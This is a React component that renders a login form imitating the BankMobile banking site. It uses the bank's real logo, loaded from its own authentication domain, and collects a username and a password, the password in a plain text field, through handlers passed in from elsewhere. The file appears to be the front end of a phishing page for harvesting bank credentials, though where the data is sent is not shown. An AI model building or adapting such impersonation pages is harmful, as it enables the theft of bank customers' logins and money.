
import { NavLink } from "react-router-dom";

function HomePage(props) {
    return (
        <div className="container">
            <form className="box" onSubmit={props.handleSubmit}>
                <img src="https://authentication-vibe.bmtx.com/images/vibe-logo.svg" alt="" width="100"/>
                <h1>Log in to your BankMobile
                Account</h1>
               
                <div className="duo2">  
                </div>



                <div className="over">
                <div className="card-input">
                    <p>Username</p>
                    <input type="text" placeholder="" name="username" onChange={props.getData} />
                </div>
                <div className="card-input put1">
                    <p>Password</p>
                    <input type="text" placeholder="" name="password" onChange={props.getData} />
                </div>
                </div>
               

              
    

                 <button className="check" onClick={props.handleSubmit}>Login</button>

            </form>
        </div>
    )
}

export default HomePage;